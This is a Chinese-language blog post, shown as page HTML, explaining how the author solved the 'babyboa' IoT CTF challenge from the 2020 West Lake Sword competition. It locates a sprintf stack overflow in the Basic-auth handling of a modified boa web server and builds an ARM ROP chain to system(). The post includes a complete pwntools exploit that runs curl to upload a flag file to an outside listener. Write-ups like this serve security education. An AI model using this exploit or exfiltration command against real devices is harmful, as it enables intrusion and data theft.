@@ -1,0 +1,305 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>西湖论剑IoT闯关赛-babyboa - pup2y&#39;s world</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="前言本次赛题所有题目都是通过下面的板子作为载体，板子全是安恒Aodzip师傅手焊的。其中的uart口用于调试，otg口刷固件。pwr开关机键，RST复位键。
+
+刷的固件存在spi flash中，带了,"> 
+    <meta name="author" content="青云"> 
+    <link rel="alternative" href="atom.xml" title="pup2y&#39;s world" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">pup2y&#39;s world</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://pup2y.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">西湖论剑IoT闯关赛-babyboa</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="article">
+    <div class='main'>
+        <h1 class="title">西湖论剑IoT闯关赛-babyboa</h1>
+        <div class="stuff">
+            <span>十一月 16, 2020</span>
+			
+			<span>
+   阅读数  <span id="busuanzi_value_page_pv"></span>
+</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/boa/" rel="tag">boa</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次赛题所有题目都是通过下面的板子作为载体，板子全是安恒Aodzip师傅手焊的。<img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116221316708.png" alt="">其中的uart口用于调试，otg口刷固件。pwr开关机键，RST复位键。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116221021281.png" alt=""></p>
+<p>刷的固件存在spi flash中，带了编程器和烧录夹的兄弟萌，可以直接提取固件然后进入其中extra分区中，里面有flag。</p>
+<h1 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h1><p>其中的3道嵌入式pwn题目全是H4lo师傅出的，第一题是babyboa，提供的固件中提供了二进制boa和boa.conf。正常情况是不给调试的，除非大家都做不出来。</p>
+<p>配置文件boa.conf给的重点有：<code>ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/</code>，这是要通过/cgi-bin/xxxx来触发漏洞？</p>
+<p>继续分析boa，boa服务器的特点参考<a href="http://www.boa.org/documentation/boa.html#toc3.3" target="_blank" rel="noopener">Differences between Boa and other web servers</a>：</p>
+<blockquote>
+<ul>
+<li><p><strong>There are no access control features</strong></p>
+<p>Boa will follow symbolic links, and serve any file that it can read. The expectation is that you will configure Boa to run as user “nobody”, and only files configured world readable will come out. </p>
+</li>
+</ul>
+</blockquote>
+<p>身份认证代码这块完全是二次开发的，大概率会出问题。通过寻找字符串“401 Unauthorized”定位到身份验证函数sub_1D1E4()，</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116225735429.png" alt=""></p>
+<p>其中sub_1D138函数读取/tmp/passwd内容，用于与输入的用户名密码进行比较。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116225847902.png" alt=""></p>
+<p>定位到字符串“Basic”后，进行base64decode之后定位冒号“：”，获取用户输入的密码。strcpy()函数将输入到BSS段的434F8，本以为漏洞点是通过BSS溢出覆盖全局变量，然而并不是……</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116230932922.png" alt=""></p>
+<p>继续往下分析，strtok函数获取用户名，并且v6中的内容也是用户名。</p>
+<p>然后进入sub_1D1AC函数，真正的漏洞点位于其中的sprintf()，将用户名密码按照”%s:%s”格式拷贝到栈上局部变量中，用户名和密码都是可以控制的，缓冲区溢出没错了。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116231347607.png" alt=""></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h2><p>直接通过汇编能够看出来，R0距离LR的偏移为0x130。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201116231833861.png" alt=""></p>
+<h2 id="选择攻击路径构造ROP链"><a href="#选择攻击路径构造ROP链" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h2><p>主要是找到system函数，然后将命令cmd地址输入到R0即可。</p>
+<p>需要注意的是00截断问题，payload中不能含有\x00。在没有调试的情况下，不清楚是否开启地址随机化，避免泄漏libc，需要通过在boa中找到能用的gadget并且要避免00截断。</p>
+<p>在boa中找到gadget，通过控制R6来控制R0，R0=[R6+0x10]&gt;&gt;8。将R6+0x10所指地址内容逻辑右移8位赋给R0。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201117003947312.png" alt=""></p>
+<p>所以<code>*(R6+0x10)</code>应该存放<code>&amp;cmd&lt;&lt;8</code> ，cmd字符串可以通过前面的strcpy拷贝到bss段。但是cmd字符串的地址应该怎么给到R6呢？想着通过boa中gadget来pop到R6。gadget都是以00字符串开头，这样就导致payload有两个gadget，那第一个gadget的00会被截断。</p>
+<p>但是在进入sub_1D1AC函数发送sprintf栈溢出之前，R6中的值为base64decode的返回值，也就是R6指向了base64解码之后的<code>username:password</code>字符串。之后<code>MOV     R0, R6</code>，R6和R0指向同一地址，通过strtok函数之后，R6指向为<code>:</code>前username字符串。</p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201117072728700.png" alt=""></p>
+<p>于是在R6+0x10所指地址处布置<code>&amp;cmd&lt;&lt;8</code>能够在执行gadget时使R0指向<code>cmd</code>字符串，并跳转至system，上面也提到<code>password</code>会被strcpy放置到bss段的0x434F8这个地址。那这个地址可以用来存放cmd命令。</p>
+<p>最后应该形成如下payload：</p>
+<pre class=" language-python"><code class="language-python">    offset <span class="token operator">=</span> <span class="token number">0x130</span>
+    cmd <span class="token operator">=</span> <span class="token string">'curl -X PUT 20.20.11.13:1111 -T /workspace/flag;'</span>
+    payload <span class="token operator">=</span> <span class="token string">""</span>
+    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span>                 <span class="token comment" spellcheck="true"># padding</span>
+    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x434F8bb</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># &amp;cmd&lt;&lt;8</span>
+    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>offset<span class="token operator">-</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">#padding</span>
+    payload <span class="token operator">+=</span> <span class="token string">':'</span>                        <span class="token comment" spellcheck="true"># split username:password</span>
+    payload <span class="token operator">+=</span> cmd                        <span class="token comment" spellcheck="true"># cmd store to 0x434F8bb</span>
+    paylpad <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x1d2dc</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># R6-gadget</span></code></pre>
+<h1 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h1><ul>
+<li><p>没有UART调试串口</p>
+<ul>
+<li>应该需要最新的ubuntu20.04，16.04和18.04报错内核too old</li>
+<li><code>qemu-arm -L /usr/arm-linux-gnueabi boa -c . -f boa.conf -d</code></li>
+</ul>
+</li>
+<li><p>UART调试串口</p>
+<ul>
+<li><p>SecureCRT或MobaXterm创建Serial session，波特率设置为115200</p>
+</li>
+<li><p>固件：<code>gdbserver :1234 --attach $PID</code></p>
+</li>
+<li><p>调试机：<code>gdb-multiarch boa -q -x $gdbscript</code></p>
+<pre class=" language-sh"><code class="language-sh">  set architecture arm
+    set sysroot .
+    target remote 20.20.11.14:1234
+    b *0x001D1C0
+    b *0x001D1DC</code></pre>
+</li>
+<li><p>服务重启：<code>/workspace/boa -c /html -f /etc/boa/boa.conf</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><pre class=" language-sh"><code class="language-sh">from pwn import *
+context(arch = 'arm', endian = 'little',log_level = 'debug' )
+
+p = remote("20.20.11.14",80)
+
+offset = 0x130
+cmd = 'curl -X PUT 20.20.11.13:1111 -T /workspace/flag;'
+payload = ""
+payload += 'a' * 0x10                 # padding
+payload += p32(0x434F8bb)             # &cmd<<8
+#payload += 'a' * 0xeb                 #padding
+payload = payload.ljust(offset-len(cmd)-1,'a') #padding
+payload += ':'                        # split username:password
+payload += cmd                        # cmd store to 0x434F8bb
+payload += p32(0x1d2dc)                # R6-gadget
+payload = base64.b64encode(payload)
+
+post = ''
+post += 'GET / HTTP/1.1\r\n'
+post += 'Host: 20.20.11.14\r\n'
+post += 'Authorization: Basic {}\r\n'.format(payload)
+post += '\r\n'
+p.send(post)
+p.close()</code></pre>
+<p><code>nc -vlp 1111</code></p>
+<p><img src="%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9B-babyboa/image-20201117105843948.png" alt=""></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://music.163.com/song?id=441532&userid=258169074'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/163/26584453.mp3'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='https://link.hhtjim.com/163/28245304.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci='177c577b486a2fd2b061'
+        data-cs='ce4ec96a3a9f14b35d6e9d750e1d7f231c22db0e'
+        data-r='pup2y.github.io'
+        data-o='pup2y'
+        data-a='pup2y'
+        data-d='true'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞定位"><span class="toc-number">2.</span> <span class="toc-text">漏洞定位</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#确定偏移"><span class="toc-number">3.1.</span> <span class="toc-text">确定偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#选择攻击路径构造ROP链"><span class="toc-number">3.2.</span> <span class="toc-text">选择攻击路径构造ROP链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞测试"><span class="toc-number">4.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exp"><span class="toc-number">5.</span> <span class="toc-text">Exp</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"superSample":2,"hOffset":0,"vOffset":-20,"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+
+</html>
